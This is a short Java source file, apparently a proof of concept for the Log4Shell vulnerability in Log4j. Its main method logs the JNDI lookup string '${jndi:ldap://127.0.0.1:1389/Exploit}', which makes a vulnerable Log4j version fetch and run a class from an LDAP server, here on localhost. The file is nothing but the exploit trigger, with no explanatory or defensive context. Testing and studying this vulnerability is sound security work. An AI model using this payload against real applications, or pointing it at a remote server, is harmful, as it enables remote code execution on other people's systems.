package com.zyk;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;


public class Log4j {
    private static final Logger LOGGER = LogManager.getLogger(Log4j.class);
    public static void main(String[] args) {
        LOGGER.error("${jndi:ldap://127.0.0.1:1389/Exploit}");
    }

}
